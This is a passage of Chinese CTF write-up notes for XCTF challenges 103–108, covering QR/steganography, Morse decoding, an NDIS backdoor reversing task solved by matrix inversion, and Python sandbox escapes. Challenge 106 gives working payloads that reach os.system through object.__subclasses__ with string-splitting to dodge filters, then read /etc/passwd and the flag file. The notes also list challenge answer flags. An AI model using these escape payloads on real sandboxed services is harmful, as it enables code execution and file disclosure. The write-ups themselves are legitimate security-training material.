FgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg=="></img></div><div>扫码得到flag。</div><div><br/></div><div>flag：flag{owid0-o91hf-9iahg}</div><div><br/></div><div><span style="font-weight: bold;">105 4433</span></div><div><br/></div><div>下载得到FIGURE.JPG文件。Stegsolve打开，在Red plane 1处发现二维码。</div><div><img src="攻防世界高手区14（103-108）_files/Image [3].png" type="image/png" data-filename="Image.png"/></div><div>扫码得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>...--.----...--..</div></div><div>按照题目提示进行4433的分组后摩斯电码，得到VYGUD。</div><div>然后按照摩斯电码的缩写规则，转码为VERYGOOD（？）。</div><div><br/></div><div>flag：VERYGOOD</div><div><br/></div><div><span style="font-weight: bold;">106 Run1</span></div><div><br/></div><div>按照题目要求nc连接服务器，提示Python沙箱逃逸。</div><div><img src="攻防世界高手区14（103-108）_files/Image [4].png" type="image/png" data-filename="Image.png"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&gt;&gt;&gt;print(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines())</div><div><br/></div><div>['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\n', 'systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\n', 'systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\n', 'systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n', '_apt:x:104:65534::/nonexistent:/bin/false\n', <font color="#FF0000">'ctf:x:1000:1000::/home/ctf:/bin/rbash\n'</font>]</div></div><div>标红的文件夹比较可疑。</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&gt;&gt;&gt;print(().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s'+' /home/ctf/').read())</div><div><br/></div><div><font color="#FF0000">5c72a1d444cf3121a5d25f2db4147ebb</font></div><div>bin</div><div>cpython.py</div><div>cpython.pyc</div><div>sandbox.py</div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&gt;&gt;&gt;print(().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb').read())</div><div><br/></div><div><font style="color: rgb(255, 0, 0);">flag{eee93c33d97aa55f785a7d10ba4ae3ce}</font></div></div><div><br/></div><div>flag：flag{eee93c33d97aa55f785a7d10ba4ae3ce}</div><div><br/></div><div><span style="font-weight: bold;">107 NdisBackDoor</span></div><div><br/></div><div>不会做，抄一下Writeup：</div><div><br/></div><div>实现一个NDIS过滤驱动监听本地数据包，模仿后门监听程序，如果是符合条件的后门激活指令（满足矩阵乘法结果），则显示相应信息。</div><div> 1、NDIS过滤驱动的安装方式，为了安装方便，驱动和inf文件需要同时发布（见解题步骤1）。</div><div> 2、通过MmGetSystemRoutineAddress函数动态获取KdDisableDebugger函数地址进行反调试，较为隐蔽。</div><div> 3、内核态动态获取kdbazis.dll或kdcom.dll基址，遍历导出函数KdSendPacket函数地址进行反调试，较为隐蔽。</div><div> 4、对后门激活ICMP数据包中的矩阵进行rot13及模余变幻，直接获取原状态矩阵较为麻烦。</div><div><br/></div><div>取长度为64的输入ROT13，再转换为8x8矩阵A。</div><div>矩阵A右乘矩阵</div><div>{</div><div>{ 0x2B, 0x16, 0x1E, 0x53, 0x35, 0x39, 0x20, 0x29 },</div><div>{ 0x35, 0x63, 0x0A, 0x28, 0x2C, 0x06, 0x32, 0x2A },</div><div>{ 0x55, 0x39, 0x14, 0x5F, 0x20, 0x19, 0x34, 0x21 },</div><div>{ 0x19, 0x0B, 0x5A, 0x09, 0x50, 0x34, 0x6F, 0x5C },</div><div>{ 0x16, 0x1A, 0x68, 0x63, 0x34, 0x4E, 0x16, 0x45 },</div><div>{ 0x4C, 0x53, 0x2F, 0x3F, 0x3F, 0x28, 0x69, 0x51 },</div><div>{ 0x39, 0x44, 0x12, 0x24, 0x0A, 0x4D, 0x55, 0x31 },</div><div>{ 0x49, 0x3B, 0x40, 0x3B, 0x43, 0x28, 0x21, 0x36 }</div><div>}</div><div>结果通过映射</div><div>{</div><div>{0x3F, 0x2C, 0x19, 0x06, 0x33, 0x20, 0x0D, 0x3A},</div><div>{0x27, 0x14, 0x01, 0x2E, 0x1B, 0x08, 0x35, 0x22},</div><div>{0x0F, 0x3C, 0x29, 0x16, 0x03, 0x30, 0x1D, 0x0A},</div><div>{0x37, 0x24, 0x11, 0x3E, 0x2B, 0x18, 0x05, 0x32},</div><div>{0x1F, 0x0C, 0x39, 0x26, 0x13, 0x00, 0x2D, 0x1A},</div><div>{0x07, 0x34, 0x21, 0x0E, 0x3B, 0x28, 0x15, 0x02},</div><div>{0x2F, 0x1C, 0x09, 0x36, 0x23, 0x10, 0x3D, 0x2A},</div><div>{0x17, 0x04, 0x31, 0x1E, 0x0B, 0x38, 0x25, 0x12}</div><div>}</div><div>与</div><div>{</div><div>{ 0x8F66, 0x6B73, 0xCCCE, 0xA78C, 0xA45E, 0x9A31, 0x7B3C, 0x8C50 },</div><div>{ 0x6D67, 0x7B2A, 0x7E22, 0xAF05, 0xB447, 0x7EDD, 0xAEF0, 0x72A4 },</div><div>{ 0x7900, 0x9146, 0xA243, 0xA3BC, 0x8087, 0xC855, 0x884F, 0x7BD6 },</div><div>{ 0x9134, 0x76C5, 0xB260, 0x945D, 0x9328, 0x915A, 0x9031, 0x8D5B },</div><div>{ 0x62E7, 0xB1C2, 0x7B0E, 0x9864, 0xAE2F, 0xA110, 0xA69B, 0x535C },</div><div>{ 0xA7FF, 0x8778, 0x9348, 0xAF07, 0x88DF, 0x9854, 0x65FA, 0x5E64 },</div><div>{ 0x6D09, 0x8B86, 0xC3C3, 0x8BF8, 0xCCE3, 0x8427, 0x847D, 0x712F },</div><div>{ 0x8B48, 0x8723, 0x7E8F, 0xE2FC, 0x9170, 0x939A, 0x8F78, 0x64A4 }</div><div>}</div><div>进行比较.</div><div>映射前矩阵应为</div><div>{</div><div>{ 0xA110, 0x7E22, 0x5E64, 0x8087, 0x8723, 0x9031, 0xA78C, 0xA7FF },</div><div>{ 0x7EDD, 0xC3C3, 0x7BD6, 0x9170, 0xB1C2, 0x7B3C, 0xAF07, 0x7900 },</div><div>{ 0x8427, 0xB260, 0x64A4, 0xAE2F, 0x7B2A, 0x65FA, 0xA3BC, 0x8B48 },</div><div>{ 0x915A, 0xCCCE, 0x535C, 0xB447, 0x8B86, 0x884F, 0xE2FC, 0x62E7 },</div><div>{ 0x9A31, 0x9348, 0x72A4, 0xCCE3, 0x76C5, 0x8F78, 0x9864, 0x6D67 },</div><div>{ 0x9854, 0xA243, 0x712F, 0x9328, 0x6B73, 0xA69B, 0xAF05, 0x6D09 },</div><div>{ 0xC855, 0x7E8F, 0x8D5B, 0xA45E, 0x8778, 0xAEF0, 0x8BF8, 0x9134 },</div><div>{ 0x939A, 0x7B0E, 0x8C50, 0x88DF, 0x9146, 0x847D, 0x945D, 0x8F66 }</div><div>}</div><div>解出矩阵A</div><div>83 49 110 84 123 71 121 45</div><div>49 114 45 68 104 118 114 103</div><div>114 101 45 108 48 104 45 111</div><div>114 112 98 122 114 32 71 49</div><div>45 121 114 45 122 66 101 114</div><div>45 108 66 104 45 78 101 114</div><div>45 110 111 86 114 45 71 98</div><div>45 49 45 49 114 110 101 125</div><div>转换为字符得 S1nT{Gy-1r-Dhvrgre-l0h-orpbzr G1-yr-zBer-lBh-Ner-noVr-Gb-1-1rne}</div><div>ROT13得 F1aG{Tl-1e-Quieter-y0u-become T1-le-mOre-yOu-Are-abIe-To-1-1ear}</div><div><br/></div><div>flag：F1aG{Tl-1e-Quieter-y0u-become T1-le-mOre-yOu-Are-abIe-To-1-1ear}</div><div><br/></div><div><span style="font-weight: bold;">108 Run</span></div><div><br/></div><div>和106是一模一样的……</div><div><br/></div><div>flag：flag{eee93c33d97aa55f785a7d10ba4ae3ce}</div></span>
</div></body></html> 